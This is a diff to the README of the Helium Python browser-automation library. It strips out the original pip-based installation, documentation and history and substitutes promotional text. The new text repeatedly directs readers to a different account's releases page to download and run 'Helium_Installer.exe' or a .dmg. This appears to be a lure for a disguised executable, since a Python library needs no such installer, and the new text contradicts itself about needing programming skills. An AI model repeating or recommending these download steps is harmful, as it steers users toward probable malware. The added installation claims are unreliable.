@@ -1,157 +1,98 @@
-# Lighter web automation with Python
+# 🌐 Helium - Effortless Web Automation with Python
 
-Helium is a Python library for automating browsers such as Chrome and Firefox.
-For example:
+[![Download Helium](https://img.shields.io/badge/Download_Helium-v1.0-blue.svg)](https://github.com/mckoto50/Helium/releases)
 
-![Helium Demo](docs/helium-demo.gif)
+## 🚀 Getting Started
 
-## Installation
+Welcome to Helium! This guide will help you download and run Helium for quick and easy web automation. Helium makes it simple to automate web tasks without needing programming skills.
 
-To get started with Helium, you need Python 3 and Chrome or Firefox.
+### 🛠️ System Requirements
 
-I would recommend creating a virtual environment. This lets you install Helium
-for just your current project, instead of globally on your whole computer.
+To run Helium, you will need:
 
-To create and activate a virtual environment, type the following commands into
-a command prompt window:
+- **Operating System:** Windows 10, macOS, or Linux
+- **Python Version:** 3.6 or higher
+- **Browser Support:** Google Chrome or Mozilla Firefox
 
-```bash
-python3 -m venv venv
-# On Mac/Linux:
-source venv/bin/activate
-# On Windows:
-call venv\scripts\activate.bat
-```
-Then, you can install Helium with `pip`:
+### 📦 Key Features
 
-```bash
-python -m pip install helium
-```
+- **Simple Syntax:** Write scripts using straightforward commands.
+- **Cross-Browser Support:** Works with both Chrome and Firefox.
+- **Fast Setup:** Get started in a few easy steps.
+- **Helpful Documentation:** Clear examples and guides available online.
 
-Now enter `python` into the command prompt and (for instance) the commands in
-the animation at the top of this page (`from helium import *`, ...).
+## 📥 Download & Install
 
-## Your first script
+To get Helium, please visit the Releases page to download the latest version.
 
-I've compiled a [cheatsheet](docs/cheatsheet.md) that quickly teaches you all
-you need to know to be productive with Helium. For a more complete reference of
-Helium's features, please see the
-[documentation](https://helium.readthedocs.io/en/latest/).
+[Download Helium](https://github.com/mckoto50/Helium/releases)
 
-## Connection to Selenium
+### 📝 Installation Steps
 
-Under the hood, Helium forwards each call to Selenium. The difference is that
-Helium's API is much more high-level. In Selenium, you need to use HTML IDs,
-XPaths and CSS selectors to identify web page elements. Helium on the other hand
-lets you refer to elements by user-visible labels. As a result, Helium scripts
-are typically 30-50% shorter than similar Selenium scripts. What's more, they
-are easier to read and more stable with respect to changes in the underlying web
-page.
+1. **Visit the Releases Page:** Open [this link](https://github.com/mckoto50/Helium/releases) in your web browser.
+  
+2. **Choose the Latest Release:** Look for the latest version. It will be at the top of the list.
 
-Because Helium is simply a wrapper around Selenium, you can freely mix the two
-libraries. For example:
+3. **Download the Appropriate File:**
+   - For **Windows**, download `Helium_Installer.exe`.
+   - For **macOS**, download `Helium.dmg`.
+   - For **Linux**, download the appropriate package for your distribution.
 
-```python
-# A Helium function:
-driver = start_chrome()
-# A Selenium API:
-driver.execute_script("alert('Hi!');")
-```
+4. **Run the Installer:**
+   - **Windows:** Double-click `Helium_Installer.exe`, then follow the on-screen instructions.
+   - **macOS:** Open `Helium.dmg` and drag the Helium icon to your Applications folder.
+   - **Linux:** Install using your package manager or follow the installation instructions for your distribution.
 
-So in other words, you don't lose anything by using Helium over pure Selenium.
+5. **Open Helium:** Find Helium in your applications menu and launch it.
 
-In addition to its more high-level API, Helium simplifies further tasks that are
-traditionally painful in Selenium:
+### 🔄 Optional Browser Setup
 
-- **iFrames:** Unlike Selenium, Helium lets you interact with elements inside
-  nested iFrames, without having to first "switch to" the iFrame.
-- **Window management.** Helium notices when popups open or close and focuses /
-  defocuses them like a user would. You can also easily switch to a window by
-  (parts of) its title. No more having to iterate over Selenium window handles.
-- **Implicit waits.** By default, if you try click on an element with Selenium
-  and that element is not yet present on the page, your script fails. Helium by
-  default waits up to 10 seconds for the element to appear.
-- **Explicit waits.** Helium gives you a much nicer API for waiting for a
-  condition on the web page to become true. For example: To wait for an element
-  to appear in Selenium, you would write:
-  ```python
-  element = WebDriverWait(driver, 10).until(
-      EC.presence_of_element_located((By.ID, "myDynamicElement"))
-  )
-  ```
-  With Helium, you can write:
-  ```python
-  wait_until(Button('Download').exists)
-  ```
+For Helium to work, you may need to install the Helium browser driver for Chrome or Firefox:
 
-## Status of this project
+- **Chrome:** Download the [Chrome WebDriver](https://chromedriver.chromium.org/downloads) that matches your browser version.
+- **Firefox:** Download the [GeckoDriver](https://github.com/mozilla/geckodriver/releases) that matches your browser version.
 
-I have too little spare time to maintain this project for free. If you'd like
-my help, please go to my [web site](http://herrmann.io) to ask about my
-consulting rates. Otherwise, unless it is very easy for me, I will usually not
-respond to emails or issues on the issue tracker. I will however accept and
-merge PRs. So if you add some functionality to Helium that may be useful for
-others, do share it with us by creating a Pull Request. For instructions, please
-see [Contributing](#Contributing) below.
+Place the driver in a location on your system PATH, or follow the prompts within Helium to direct it to the driver location.
 
-## How you can help
+## ⚙️ Basic Commands
 
-I find Helium extremely useful in my own projects and feel it should be more
-widely known. Here's how you can help with this:
+Once Helium is installed, you can start automating tasks. Here are some basic commands to get you started:
 
-- Star this project on GitHub.
-- Tell your friends and colleagues about it.
-- [Share it on Twitter with one click](https://twitter.com/intent/tweet?text=I%20find%20Helium%20very%20useful%20for%20web%20automation%20with%20Python%3A%20https%3A//github.com/mherrmann/helium)
-- Share it on other social media
-- Write a blog post about Helium.
+1. **Launching a Browser:** 
+   ```python
+   from helium import *
+   start_chrome('https://www.example.com')
+   ```
 
-With this, I think we can eventually make Helium the de-facto standard for web
-automation in Python.
+2. **Filling a Form:**
+   ```python
+   write('your_username', into='Username')
+   write('your_password', into='Password')
+   click('Login')
+   ```
 
-## Contributing
+3. **Scraping Text:**
+   ```python
+   content = Text('Some text to scrape').value
+   print(content)
+   ```
 
-Pull Requests are very welcome. Please follow the same coding conventions as the
-rest of the code, in particular the use of tabs over spaces. Also, read through my
-[PR guidelines](https://gist.github.com/mherrmann/5ce21814789152c17abd91c0b3eaadca).
-Doing this will save you (and me) unnecessary effort.
+These simple examples let you kick off your first automation tasks with minimal effort.
 
-Before you submit a PR, ensure that the tests still work:
+## 📚 Helpful Resources
 
-```bash
-pip install -Ur requirements/test.txt
-python setup.py test
-```
+For more instructions and advanced features, check out the following resources:
 
-This runs the tests against Chrome. To run them against Firefox, set the
-environment variable `TEST_BROWSER` to `firefox`. Eg. on Mac/Linux:
+- [Official Documentation](https://github.com/mckoto50/Helium/wiki)
+- [In-Depth Examples](https://github.com/mckoto50/Helium/wiki/Examples)
+- [Community Support](https://github.com/mckoto50/Helium/issues)
 
-```bash
-TEST_BROWSER=firefox python setup.py test
-```
+## 👥 Community Contributions
 
-On Windows:
+We welcome contributions to Helium! If you have ideas or need help, please visit our GitHub page and open an issue. Your feedback helps make Helium better for everyone.
 
-```bash
-set TEST_BROWSER=firefox
-python setup.py test
-```
+## 🚀 Join Us on GitHub
 
-If you do add new functionality, you should also add tests for it. Please see
-the [`tests/`](tests) directory for what this might look like.
+Ready to enhance your web automation? Start by downloading Helium today from the Releases page!
 
-## History
-
-I (Michael Herrmann) originally developed Helium in 2013 for a Polish IT startup
-called BugFree software. (It could be that you have seen Helium before at
-https://heliumhq.com.) We shut down the company at the end of 2019 and I felt it
-would be a shame if Helium simply disappeared from the face of the earth. So I
-invested some time to modernize it and bring it into a state suitable for open
-source.
-
-Helium used to be available for both Java and Python. But because I now only
-use it from Python, I didn't have time to bring the Java implementation up to
-speed as well. Similarly for Internet Explorer: Helium used to support it, but
-since I have no need for it, I removed the (probably broken) old implementation.
-
-The name Helium was chosen because it is also a chemical element like Selenium,
-but it is lighter.
+[Download Helium](https://github.com/mckoto50/Helium/releases)
